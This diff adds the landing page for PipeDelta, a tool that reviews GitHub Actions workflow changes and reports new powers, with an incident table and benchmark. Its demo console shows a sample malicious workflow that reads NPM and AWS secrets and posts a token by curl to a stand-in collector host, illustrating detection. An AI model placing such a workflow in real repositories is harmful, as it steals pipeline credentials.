@@ -1,0 +1,502 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>PipeDelta</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<meta name="description" content="PipeDelta reviews every change to your GitHub Actions pipeline, by pull request or direct push, and says in plain words what it can now do.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700;12..96,800&family=Instrument+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;600&display=swap">
+<style>
+/* Layout: a diff gutter runs down the page. Every section is a "hunk": a thin
+   gutter mark on the left, content on the right. A deliberate light theme. */
+:root{
+  --bg:#f7f8fb; --surface:#ffffff; --raised:#f0f2f8; --line:#e2e6ef;
+  --fg:#0e1526; --muted:#4a5571; --faint:#7d87a1;
+  --accent:#b45309;            /* "new power": amber, the colour of a warning light */
+  --accent-soft:#fff4e5;
+  --accent-ink:#ffffff;
+  --add:#0b7a50; --add-bg:#e8f7ef;
+  --del:#c0262d; --del-bg:#fdecec;
+  --high:#c0262d; --med:#a35a00; --low:#66708a;
+  --display:"Bricolage Grotesque", "Segoe UI", system-ui, sans-serif;
+  --body:"Instrument Sans", "Segoe UI", system-ui, sans-serif;
+  --mono:"JetBrains Mono", ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
+  --radius:12px;
+  color-scheme:light;
+}
+
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.6 var(--body);-webkit-font-smoothing:antialiased}
+a{color:inherit}
+:focus-visible{outline:2px solid var(--accent);outline-offset:3px;border-radius:4px}
+code,pre,.mono{font-family:var(--mono)}
+.wrap{max-width:1160px;margin:0 auto;padding-left:max(20px, env(safe-area-inset-left, 0px));padding-right:max(20px, env(safe-area-inset-right, 0px))}
+
+/* nav */
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top, 0px);z-index:20;background:var(--bg)}
+.nav{position:sticky;top:env(safe-area-inset-top, 0px);z-index:10;background:color-mix(in srgb, var(--bg) 86%, transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav .wrap{display:flex;align-items:center;gap:24px;padding-block:14px}
+.brand{display:flex;align-items:center;gap:10px;font:700 1.15rem var(--display);text-decoration:none;letter-spacing:-.01em}
+.brand .delta{display:grid;place-items:center;width:30px;height:30px;border-radius:8px;background:var(--accent);color:var(--accent-ink);font:800 1.05rem var(--display)}
+.nav nav{display:flex;gap:22px;margin-left:auto;font-size:.95rem;color:var(--muted)}
+.nav nav a{text-decoration:none}
+.nav nav a:hover{color:var(--fg)}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:11px 18px;border-radius:999px;font:600 .95rem var(--body);text-decoration:none;border:1px solid var(--line);background:var(--surface);color:var(--fg);cursor:pointer;white-space:nowrap}
+.btn:hover{border-color:var(--muted)}
+.btn.primary{background:var(--accent);color:var(--accent-ink);border-color:var(--accent)}
+.btn.primary:hover{filter:brightness(1.07)}
+.nav .btn{padding:8px 14px;font-size:.88rem}
+
+/* hero */
+.hero{padding-block:72px 64px;background:radial-gradient(1200px 420px at 85% 0%, var(--accent-soft), transparent 70%), linear-gradient(var(--bg), var(--bg))}
+.hero .wrap{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.05fr);gap:56px;align-items:center}
+.eyebrow{display:inline-block;font:600 .74rem var(--mono);letter-spacing:.08em;text-transform:uppercase;color:var(--accent);background:var(--accent-soft);padding:5px 10px;border-radius:999px}
+h1,h2,h3{font-family:var(--display);text-wrap:balance;margin:0;letter-spacing:-.02em}
+h1{font-size:clamp(2.4rem, 5.2vw, 4.1rem);line-height:1.02;font-weight:800;margin-top:14px}
+h1 .plus{color:var(--add)}
+.lede{font-size:1.15rem;color:var(--muted);max-width:34em;margin:20px 0 28px}
+.ctas{display:flex;gap:12px;flex-wrap:wrap}
+.proof{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:20px;margin-top:36px;padding-top:24px;border-top:1px solid var(--line)}
+.proof div{display:grid}
+.proof b{font:800 clamp(1.3rem,2.4vw,1.7rem) var(--display);font-variant-numeric:tabular-nums}
+.proof span{font-size:.85rem;color:var(--muted);max-width:14em}
+
+/* the demo console */
+.console{background:var(--surface);border:1px solid var(--line);border-radius:16px;overflow:hidden;box-shadow:0 1px 2px rgba(14,21,38,.06),0 24px 60px -24px rgba(14,21,38,.22);min-width:0}
+.tabs{display:flex;gap:4px;padding:8px;border-bottom:1px solid var(--line);background:var(--raised)}
+.tab{flex:1;border:0;background:none;color:var(--muted);font:600 .85rem var(--body);padding:9px 10px;border-radius:8px;cursor:pointer}
+.tab[aria-selected="true"]{background:var(--surface);color:var(--fg);box-shadow:0 0 0 1px var(--line)}
+.pane-head{display:flex;justify-content:space-between;gap:12px;align-items:center;padding:12px 16px;font:500 .78rem var(--mono);color:var(--muted);border-bottom:1px solid var(--line)}
+.pane-head .who{color:var(--fg)}
+.diff{margin:0;padding:12px 0;font:400 .78rem/1.65 var(--mono);overflow-x:auto}
+.diff span{display:block;padding:0 16px;white-space:pre}
+.diff .a{background:var(--add-bg);color:var(--add)}
+.diff .a::before{content:"+ ";opacity:.7}
+.diff .c::before{content:"  "}
+.diff .c{color:var(--muted)}
+.report{border-top:1px solid var(--line);padding:14px 16px 18px;display:grid;gap:10px}
+.report h4{margin:0;font:600 .9rem var(--body)}
+.report h4 em{font-style:normal;color:var(--high)}
+.finding{display:grid;grid-template-columns:auto minmax(0,1fr);gap:10px;align-items:start;font-size:.88rem;line-height:1.45}
+.lvl{font:600 .68rem var(--mono);text-transform:uppercase;letter-spacing:.06em;padding:3px 7px;border-radius:5px;margin-top:1px}
+.lvl.high{color:var(--high);background:var(--del-bg);box-shadow:inset 0 0 0 1px color-mix(in srgb, var(--high) 40%, transparent)}
+.lvl.medium{color:var(--med);background:color-mix(in srgb, var(--med) 12%, transparent);box-shadow:inset 0 0 0 1px color-mix(in srgb, var(--med) 40%, transparent)}
+.lvl.low{color:var(--low);background:color-mix(in srgb, var(--low) 12%, transparent)}
+.fix{display:block;color:var(--muted);font-size:.8rem;margin-top:3px}
+.fix code{color:var(--fg);font-size:.76rem}
+.verdict{display:flex;align-items:center;gap:8px;font:600 .8rem var(--mono);color:var(--high);padding-top:8px;border-top:1px dashed var(--line)}
+.verdict i{width:9px;height:9px;border-radius:50%;background:var(--high);box-shadow:0 0 0 4px var(--del-bg)}
+
+/* incidents strip */
+.strip{border-block:1px solid var(--line);background:var(--surface)}
+.strip .wrap{display:flex;align-items:center;gap:14px 28px;flex-wrap:wrap;padding-block:18px;font-size:.9rem;color:var(--muted)}
+.strip b{color:var(--fg);font-weight:600}
+.strip .tag{font:500 .8rem var(--mono);color:var(--fg)}
+.strip .tag small{color:var(--faint);margin-left:6px}
+
+/* sections as hunks */
+section.hunk{padding-block:88px 0}
+.hunk-head{display:grid;grid-template-columns:auto minmax(0,1fr);gap:18px;align-items:start;margin-bottom:36px}
+.gutter{font:600 .78rem var(--mono);color:var(--faint);padding-top:10px;white-space:nowrap}
+.gutter b{color:var(--add)}
+h2{font-size:clamp(1.8rem, 3.4vw, 2.6rem);line-height:1.08;font-weight:700}
+.hunk-head p{color:var(--muted);max-width:44em;margin:12px 0 0;font-size:1.05rem}
+
+/* benchmark */
+.bench{display:grid;grid-template-columns:minmax(0,1.3fr) minmax(0,1fr);gap:24px}
+.panel{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);padding:24px;min-width:0;box-shadow:0 1px 2px rgba(14,21,38,.04)}
+.panel h3{font-size:1.1rem;font-weight:700}
+.panel .sub{color:var(--muted);font-size:.88rem;margin:4px 0 20px}
+.bars{display:grid;gap:14px}
+.bar{display:grid;grid-template-columns:9.5em minmax(0,1fr) 3.4em;gap:12px;align-items:center;font-size:.9rem}
+.bar .track{height:14px;border-radius:7px;background:var(--raised);overflow:hidden}
+.bar .fill{height:100%;border-radius:7px;background:#b8c0d3;transform-origin:left;animation:grow 1s cubic-bezier(.2,.8,.2,1) both}
+.bar.us .fill{background:var(--accent)}
+.bar .n{font:600 .9rem var(--mono);text-align:right;font-variant-numeric:tabular-nums}
+.bar.us .name{font-weight:600}
+@keyframes grow{from{transform:scaleX(.02)}to{transform:scaleX(1)}}
+.note{font-size:.8rem;color:var(--faint);margin-top:18px;line-height:1.5}
+.stat{display:grid;gap:4px;padding-block:14px;border-bottom:1px solid var(--line)}
+.stat:last-of-type{border-bottom:0}
+.stat b{font:800 2rem var(--display);font-variant-numeric:tabular-nums}
+.stat span{color:var(--muted);font-size:.9rem}
+
+.table-wrap{overflow-x:auto;margin-top:24px;border:1px solid var(--line);border-radius:var(--radius);background:var(--surface)}
+table{border-collapse:collapse;width:100%;min-width:720px;font-size:.88rem}
+th,td{text-align:left;padding:12px 16px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font:600 .72rem var(--mono);text-transform:uppercase;letter-spacing:.06em;color:var(--faint);background:var(--raised)}
+tr:last-child td{border-bottom:0}
+td.when{font:500 .8rem var(--mono);color:var(--muted);white-space:nowrap}
+td a{text-decoration-color:var(--faint);text-underline-offset:3px}
+.yes,.no{font:600 .78rem var(--mono);white-space:nowrap}
+.yes{color:var(--add)} .no{color:var(--faint)}
+.via{display:inline-block;font:500 .72rem var(--mono);padding:2px 7px;border-radius:5px;background:var(--raised);color:var(--muted);white-space:nowrap}
+.via.push{background:var(--del-bg);color:var(--high)}
+
+/* steps */
+.steps{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:20px;counter-reset:s}
+.step{border-top:2px solid var(--line);padding-top:18px}
+.step:first-child{border-color:var(--accent)}
+.step .k{font:600 .78rem var(--mono);color:var(--accent)}
+.step h3{font-size:1.2rem;margin:8px 0 8px}
+.step p{color:var(--muted);margin:0;font-size:.95rem}
+
+/* features */
+.features{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:1px;background:var(--line);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}
+.feat{background:var(--surface);padding:26px 24px;min-width:0}
+.feat h3{font-size:1.08rem;font-weight:700;margin-bottom:8px;display:flex;gap:10px;align-items:baseline}
+.feat h3 .mono{font-size:.75rem;color:var(--accent);font-weight:600}
+.feat p{margin:0;color:var(--muted);font-size:.93rem}
+.feat code{font-size:.82rem;color:var(--fg)}
+
+/* quick start */
+.qs{display:grid;grid-template-columns:minmax(0,1.4fr) minmax(0,1fr);gap:24px;align-items:start}
+.code{position:relative;background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);min-width:0}
+.code .bar-top{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;border-bottom:1px solid var(--line);font:500 .78rem var(--mono);color:var(--muted)}
+.copy{border:1px solid var(--line);background:var(--raised);color:var(--fg);font:600 .75rem var(--body);padding:5px 10px;border-radius:6px;cursor:pointer}
+.code pre{margin:0;padding:16px;overflow-x:auto;font-size:.8rem;line-height:1.6}
+.code .k1{color:var(--accent)} .code .cm{color:var(--faint)} .code .s{color:var(--add)}
+.side{display:grid;gap:16px}
+.side .code pre{white-space:pre-wrap;word-break:break-all}
+
+/* roadmap */
+.road{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:0;position:relative}
+.phase{padding:22px 20px 0 0;position:relative}
+.phase::before{content:"";position:absolute;left:0;right:0;top:0;height:2px;background:var(--line)}
+.phase.done::before{background:var(--accent)}
+.phase .dot{position:absolute;top:-6px;left:0;width:14px;height:14px;border-radius:50%;background:var(--bg);border:2px solid var(--faint)}
+.phase.done .dot{background:var(--accent);border-color:var(--accent)}
+.phase .st{font:600 .72rem var(--mono);text-transform:uppercase;letter-spacing:.06em;color:var(--faint)}
+.phase.done .st{color:var(--accent)}
+.phase h3{font-size:1.15rem;margin:6px 0 8px}
+.phase p{margin:0;color:var(--muted);font-size:.9rem;padding-right:8px}
+
+footer{margin-top:96px;border-top:1px solid var(--line);padding-block:32px;color:var(--muted);font-size:.88rem}
+footer .wrap{display:flex;gap:16px 32px;flex-wrap:wrap;justify-content:space-between}
+
+@media (max-width:900px){
+  .hero .wrap,.bench,.qs{grid-template-columns:minmax(0,1fr)}
+  .features,.steps{grid-template-columns:minmax(0,1fr) minmax(0,1fr)}
+  .road{grid-template-columns:minmax(0,1fr) minmax(0,1fr);row-gap:32px}
+  .nav nav{display:none}
+  .nav .btn{margin-left:auto}
+}
+@media (max-width:560px){
+  .features,.steps,.road{grid-template-columns:minmax(0,1fr)}
+  .hero{padding-block:44px 40px}
+  .hunk-head{grid-template-columns:minmax(0,1fr)}
+  .gutter{padding-top:0}
+  .bar{grid-template-columns:7.5em minmax(0,1fr) 3em;font-size:.84rem}
+  section.hunk{padding-block:64px 0}
+}
+@media (prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto}
+  .bar .fill{animation:none}
+}
+</style>
+</head>
+<body>
+
+<header class="nav">
+  <div class="wrap">
+    <a class="brand" href="#top"><span class="delta" aria-hidden="true">Δ</span>PipeDelta</a>
+    <nav aria-label="Sections">
+      <a href="#evidence">Evidence</a>
+      <a href="#how">How it works</a>
+      <a href="#start">Quick start</a>
+      <a href="#roadmap">Roadmap</a>
+    </nav>
+    <a class="btn" href="https://github.com/Vachana7/pipedelta">GitHub</a>
+  </div>
+</header>
+
+<main id="top">
+<section class="hero">
+  <div class="wrap">
+    <div>
+      <div class="eyebrow">Change review for CI/CD · v0.5</div>
+      <h1>Your pipeline just changed. <span class="plus">What can it do now?</span></h1>
+      <p class="lede">PipeDelta reads every change to your GitHub Actions workflows, by pull request or by direct push, and tells you in plain sentences which new powers the pipeline gained. Dangerous gains fail the check, with a fix for each.</p>
+      <div class="ctas">
+        <a class="btn primary" href="#start">Add it to a repository</a>
+        <a class="btn" href="#evidence">See the evidence</a>
+      </div>
+      <div class="proof">
+        <div><b>9 of 9</b><span>real 2024 to 2026 attacks blocked in the replay benchmark</span></div>
+        <div><b>1 in 11</b><span>real workflow commits flagged high, against 1 in 3 for zizmor</span></div>
+        <div><b>Push + PR</b><span>reviews direct pushes too, where the 2026 attacks came in</span></div>
+      </div>
+    </div>
+
+    <div class="console" aria-label="Example PipeDelta report">
+      <div class="tabs" role="tablist">
+        <button class="tab" role="tab" id="tab-push" aria-selected="true" aria-controls="pane">Direct push · GhostAction 2026</button>
+        <button class="tab" role="tab" id="tab-pr" aria-selected="false" aria-controls="pane">Pull request · Ultralytics</button>
+      </div>
+      <div id="pane" role="tabpanel"></div>
+    </div>
+  </div>
+</section>
+
+<div class="strip">
+  <div class="wrap">
+    <b>Rules drawn from real incidents</b>
+    <span class="tag">wfx-loot<small>Nov 2026</small></span>
+    <span class="tag">GhostAction<small>2025, 2026</small></span>
+    <span class="tag">Mini Shai-Hulud<small>May 2026</small></span>
+    <span class="tag">prt-scan<small>Apr 2026</small></span>
+    <span class="tag">tj-actions<small>Mar 2025</small></span>
+    <span class="tag">Ultralytics<small>Dec 2024</small></span>
+  </div>
+</div>
+
+<section class="hunk" id="problem">
+  <div class="wrap">
+    <div class="hunk-head">
+      <div class="gutter">@@ <b>+1</b> @@</div>
+      <div>
+        <h2>The biggest 2026 attacks never opened a pull request.</h2>
+        <p>GhostAction's return hit more than 30,000 repositories and wfx-loot about 8,000. Both used stolen tokens to push secret-stealing workflows straight to the default branch, so pull-request checks never ran. Where a reviewer did see a change, it was ten plausible lines of YAML. Scanners judge whether a file is weak today. PipeDelta asks a different question: what did this change add?</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="hunk" id="evidence">
+  <div class="wrap">
+    <div class="hunk-head">
+      <div class="gutter">@@ <b>+2</b> @@</div>
+      <div>
+        <h2>Measured, with the caveats left in.</h2>
+        <p>Nine real incidents, each rebuilt from its public write-up as the workflow change it made or depended on. PipeDelta runs zizmor as a second opinion; the comparison shows what kind of change each tool notices.</p>
+      </div>
+    </div>
+
+    <div class="bench">
+      <div class="panel">
+        <h3>Incident replay: attacks blocked</h3>
+        <p class="sub">9 incidents, Dec 2024 to Nov 2026. Blocked means a high finding on the change.</p>
+        <div class="bars" role="list">
+          <div class="bar us" role="listitem"><span class="name">PipeDelta 0.5</span><div class="track"><div class="fill" style="width:100%"></div></div><span class="n">9/9</span></div>
+          <div class="bar" role="listitem"><span class="name">PipeDelta 0.4</span><div class="track"><div class="fill" style="width:66.7%"></div></div><span class="n">6/9</span></div>
+          <div class="bar" role="listitem"><span class="name">zizmor 1.32</span><div class="track"><div class="fill" style="width:22.2%"></div></div><span class="n">2/9</span></div>
+        </div>
+        <p class="note">The cases were rebuilt alongside the v0.5 rules, and one rule was raised after a miss, so this is not an independent test. zizmor is built for posture, not changes. Full table and sources: docs/REPLAY.md.</p>
+      </div>
+      <div class="panel">
+        <h3>Real history, 1,659 commits</h3>
+        <p class="sub">Every workflow change in eight Python projects, replayed.</p>
+        <div class="stat"><b>9.3%</b><span>flagged high by PipeDelta 0.4, mostly unpinned outside actions</span></div>
+        <div class="stat"><b>31.2%</b><span>would get a new high from zizmor alone</span></div>
+        <div class="stat"><b>9 of 12</b><span>self-written attack cases blocked (zizmor 5, poutine 2)</span></div>
+      </div>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>When</th><th>Incident</th><th>How it arrived</th><th>What changed</th><th>PipeDelta 0.5</th><th>zizmor</th></tr></thead>
+        <tbody>
+          <tr><td class="when">2026-11</td><td><a href="https://techaeris.com/2026/11/12/github-actions-attack-hits-1835-repos/">wfx-loot</a></td><td><span class="via push">direct push</span></td><td>Mints cloud OIDC tokens, sends every secret out, deletes its own run</td><td class="yes">blocked</td><td class="no">no high</td></tr>
+          <tr><td class="when">2026-09</td><td><a href="https://nhimg.org/ghostaction-returns-2026-772-repositories">GhostAction</a></td><td><span class="via push">direct push</span></td><td>Fake "Github Actions Security" workflow posts secrets over HTTP</td><td class="yes">blocked</td><td class="no">no high</td></tr>
+          <tr><td class="when">2026-05</td><td><a href="https://labs.cloudsecurityalliance.org/research/csa-research-note-mini-shai-hulud-npm-supply-chain-20260516/">Mini Shai-Hulud</a></td><td><span class="via">pull request</span></td><td>OIDC identity added to a workflow outsiders can start</td><td class="yes">blocked</td><td class="no">no high</td></tr>
+          <tr><td class="when">2026-04</td><td><a href="https://labs.cloudsecurityalliance.org/research/csa-research-note-github-actions-prt-scan-supply-chain-2026/">prt-scan</a></td><td><span class="via">pull request</span></td><td>Outsider-triggered workflow can add its own approval label</td><td class="yes">blocked</td><td class="no">no high</td></tr>
+          <tr><td class="when">2026-03</td><td><a href="https://labs.cloudsecurityalliance.org/research/csa-research-note-github-actions-prt-scan-supply-chain-2026/">prt-scan</a></td><td><span class="via push">token push</span></td><td>New workflow prints every secret, double-encoded, into the log</td><td class="yes">blocked</td><td class="no">no high</td></tr>
+          <tr><td class="when">2026-02</td><td><a href="https://www.stephane-robert.info/en/docs/github-actions/security/supply-chain-attacks/">hackerbot-claw</a></td><td><span class="via">pull request</span></td><td>Branch name pasted into a shell command</td><td class="yes">blocked</td><td class="yes">high</td></tr>
+          <tr><td class="when">2025-06</td><td><a href="https://www.stephane-robert.info/en/docs/github-actions/security/supply-chain-attacks/">gluestack-ui</a></td><td><span class="via">pull request</span></td><td>Discussion title and body pasted into a shell command</td><td class="yes">blocked</td><td class="yes">high</td></tr>
+          <tr><td class="when">2025-03</td><td><a href="https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066">tj-actions</a></td><td><span class="via">upstream tag</span></td><td>Action code changed to dump the runner's memory</td><td class="yes">blocked</td><td class="no">no high</td></tr>
+          <tr><td class="when">2024-12</td><td><a href="https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/">Ultralytics</a></td><td><span class="via">pull request</span></td><td>Build cache turned on in a workflow outsiders can start</td><td class="yes">blocked</td><td class="no">no high</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<section class="hunk" id="how">
+  <div class="wrap">
+    <div class="hunk-head">
+      <div class="gutter">@@ <b>+3</b> @@</div>
+      <div>
+        <h2>Diff the powers, not the lines.</h2>
+        <p>A secret on its own is normal. A new address on its own is normal. The same job gaining both is how secrets get stolen, and only a before-and-after comparison sees it.</p>
+      </div>
+    </div>
+    <div class="steps">
+      <div class="step"><div class="k">step 1</div><h3>Read both versions</h3><p>Workflow files and the actions stored in the repository, at the base and the head of a pull request or a push. The trust list comes from the base, so a change cannot trust itself.</p></div>
+      <div class="step"><div class="k">step 2</div><h3>List the powers gained</h3><p>Secrets, addresses, token permissions, OIDC identity, triggers, outside code, caches, hidden commands, self-modification. Renames and version bumps are not counted as new.</p></div>
+      <div class="step"><div class="k">step 3</div><h3>Explain and block</h3><p>One sentence per power, a concrete fix, and a failing check at the level you choose. The same report goes to the PR comment, the run summary and GitHub's Security tab.</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="hunk" id="features">
+  <div class="wrap">
+    <div class="hunk-head">
+      <div class="gutter">@@ <b>+4</b> @@</div>
+      <div><h2>Built like the tools it protects.</h2></div>
+    </div>
+    <div class="features">
+      <div class="feat"><h3>Push review <span class="mono">new</span></h3><p>Runs on <code>push</code> as well as pull requests, and fails closed if it cannot read the commit before a force push.</p></div>
+      <div class="feat"><h3>Plain language</h3><p>"The same job can read secrets, so they could be sent there." Every finding is a sentence a reviewer can act on, with the fix next to it.</p></div>
+      <div class="feat"><h3>Security tab <span class="mono">SARIF</span></h3><p>Findings land in GitHub code scanning beside CodeQL, so they show in the PR diff and the alert list.</p></div>
+      <div class="feat"><h3>Second opinion</h3><p><code>--zizmor on</code> keeps only zizmor's new findings, explains them the same way and marks where both tools agree.</p></div>
+      <div class="feat"><h3>Trust list</h3><p>Name the actions and hosts you rely on in <code>.pipedelta.yml</code>. Widening the list is itself reported.</p></div>
+      <div class="feat"><h3>Signed releases</h3><p>Multi-arch images on GHCR, signed with Sigstore, with SLSA build provenance and an SPDX SBOM.</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="hunk" id="start">
+  <div class="wrap">
+    <div class="hunk-head">
+      <div class="gutter">@@ <b>+5</b> @@</div>
+      <div><h2>Add it in one file.</h2><p>Mark the check as required in your branch rules so a high finding really blocks.</p></div>
+    </div>
+    <div class="qs">
+      <div class="code">
+        <div class="bar-top"><span>.github/workflows/pipedelta.yml</span><button class="copy" data-copy="wf" type="button">Copy</button></div>
+<pre id="wf"><span class="k1">on</span>:
+  <span class="k1">pull_request</span>:
+    <span class="k1">paths</span>: [<span class="s">".github/**"</span>, <span class="s">"**/action.yml"</span>]
+  <span class="k1">push</span>:                <span class="cm"># catch direct pushes too</span>
+    <span class="k1">branches</span>: [main]
+<span class="k1">permissions</span>:
+  <span class="k1">contents</span>: read
+<span class="k1">jobs</span>:
+  <span class="k1">review</span>:
+    <span class="k1">runs-on</span>: ubuntu-latest
+    <span class="k1">permissions</span>:
+      <span class="k1">contents</span>: read
+      <span class="k1">pull-requests</span>: write
+    <span class="k1">steps</span>:
+      - <span class="k1">uses</span>: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
+        <span class="k1">with</span>: { <span class="k1">fetch-depth</span>: 0, <span class="k1">persist-credentials</span>: false }
+      - <span class="k1">uses</span>: Vachana7/pipedelta@&lt;release commit&gt;  <span class="cm"># v0.5.0</span>
+        <span class="k1">with</span>:
+          <span class="k1">token</span>: ${{ github.token }}
+          <span class="k1">fail-on</span>: high</pre>
+      </div>
+      <div class="side">
+        <div class="code">
+          <div class="bar-top"><span>Try it locally</span><button class="copy" data-copy="cli" type="button">Copy</button></div>
+<pre id="cli">pip install -e .
+python -m pipedelta git main HEAD</pre>
+        </div>
+        <div class="code">
+          <div class="bar-top"><span>Offline demo, Docker only</span><button class="copy" data-copy="dk" type="button">Copy</button></div>
+<pre id="dk">docker compose run --rm ghost
+docker compose run --rm wfxloot</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="hunk" id="roadmap">
+  <div class="wrap">
+    <div class="hunk-head">
+      <div class="gutter">@@ <b>+6</b> @@</div>
+      <div><h2>Where it goes next.</h2><p>Each phase ends in something public: a release, a dataset or a write-up.</p></div>
+    </div>
+    <div class="road">
+      <div class="phase done"><span class="dot"></span><div class="st">Shipped in 0.5</div><h3>Proof</h3><p>2026 attack rules, push review, replay benchmark, SARIF, signed multi-arch images.</p></div>
+      <div class="phase"><span class="dot"></span><div class="st">Next</div><h3>Upstream review</h3><p>Diff an action's own code when its pinned commit or <code>actions.lock</code> entry changes. Publish precision on real history.</p></div>
+      <div class="phase"><span class="dot"></span><div class="st">Planned</div><h3>Org monitor</h3><p>A GitHub App that reviews every push from outside the repository. Helm chart, Prometheus metrics, Grafana board.</p></div>
+      <div class="phase"><span class="dot"></span><div class="st">Later</div><h3>Reach</h3><p>Scale run on 500+ repositories, egress log comparison, a GitLab CI adapter.</p></div>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <span>PipeDelta · reads workflow files, never runs them. A person should still review every change.</span>
+    <a href="https://github.com/Vachana7/pipedelta">github.com/Vachana7/pipedelta</a>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var scenes = {
+    push: {
+      who: 'Push to main by maintainer-bot · 3f9c2e1..a71b0d4',
+      file: '.github/workflows/security.yml (new file)',
+      diff: [
+        ['a','name: Github Actions Security'],
+        ['a','on: [push, workflow_dispatch]'],
+        ['a','jobs:'],
+        ['a','  security:'],
+        ['a','    runs-on: ubuntu-latest'],
+        ['a','    steps:'],
+        ['a','      - env:'],
+        ['a','          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}'],
+        ['a','          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}'],
+        ['a','        run: curl -X POST http://collector.example.invalid -d "$NPM_TOKEN"']
+      ],
+      head: 'Pushed straight to main, skipping review. <em>4 high</em> new powers.',
+      findings: [
+        ['high','In job \'security\', a command now contacts collector.example.invalid. The same job can read secrets, so they could be sent there.','Make sure this address is meant to receive data, or move the secret to a job that does not contact it.'],
+        ['high','In job \'security\', can now read the secret NPM_TOKEN.',''],
+        ['high','In job \'security\', can now read the secret AWS_SECRET_ACCESS_KEY.',''],
+        ['medium','In job \'security\', no limit is set on the pipeline token.','Add <code>permissions: { contents: read }</code> at the top of the file.']
+      ]
+    },
+    pr: {
+      who: 'Pull request #212 · "ci: speed up format check"',
+      file: '.github/workflows/format.yml',
+      diff: [
+        ['c','on:'],
+        ['c','  pull_request_target:'],
+        ['c','jobs:'],
+        ['c','  format:'],
+        ['c','    steps:'],
+        ['c','      - uses: actions/checkout@11d5960a3267...'],
+        ['a','      - uses: actions/setup-python@a26af69be951...'],
+        ['a','        with:'],
+        ['a','          cache: pip'],
+        ['c','      - run: pip install ruff && ruff format --check .']
+      ],
+      head: 'A one-line speed-up. <em>1 high</em> new power.',
+      findings: [
+        ['high','In job \'format\', now saves or restores a build cache. Outsiders can start this workflow (\'pull_request_target\'), so they could put poisoned files in the cache that later release runs restore (the Ultralytics attack, 2024).','Split the workflow: untrusted code runs under \'pull_request\' with no cache writes.'],
+        ['low','In job \'format\', now runs GitHub\'s own action actions/setup-python.','']
+      ]
+    }
+  };
+  var pane = document.getElementById('pane');
+  function esc(t){ return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+  function render(key){
+    var s = scenes[key];
+    var h = '<div class="pane-head"><span class="who">'+esc(s.who)+'</span></div>';
+    h += '<div class="pane-head"><span>'+esc(s.file)+'</span></div>';
+    h += '<pre class="diff">' + s.diff.map(function(l){ return '<span class="'+l[0]+'">'+esc(l[1])+'</span>'; }).join('') + '</pre>';
+    h += '<div class="report"><h4>PipeDelta: '+s.head+'</h4>';
+    s.findings.forEach(function(f){
+      h += '<div class="finding"><span class="lvl '+f[0]+'">'+f[0]+'</span><div>'+esc(f[1]) + (f[2] ? '<span class="fix">fix: '+f[2]+'</span>' : '') + '</div></div>';
+    });
+    h += '<div class="verdict"><i></i>Check failed · fail-on: high</div></div>';
+    pane.innerHTML = h;
+    document.querySelectorAll('.tab').forEach(function(t){ t.setAttribute('aria-selected', String(t.id === 'tab-'+key)); });
+  }
+  document.getElementById('tab-push').addEventListener('click', function(){ render('push'); });
+  document.getElementById('tab-pr').addEventListener('click', function(){ render('pr'); });
+  render('push');
+
+  document.querySelectorAll('.copy').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var el = document.getElementById(btn.getAttribute('data-copy'));
+      var text = el.innerText;
+      function done(){ btn.textContent = 'Copied'; setTimeout(function(){ btn.textContent = 'Copy'; }, 1600); }
+      function fallback(){ var r = document.createRange(); r.selectNodeContents(el); var sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(r); btn.textContent = 'Selected'; }
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(done, fallback);
+      } else { fallback(); }
+    });
+  });
+})();
+</script>
+</body>
+</html>
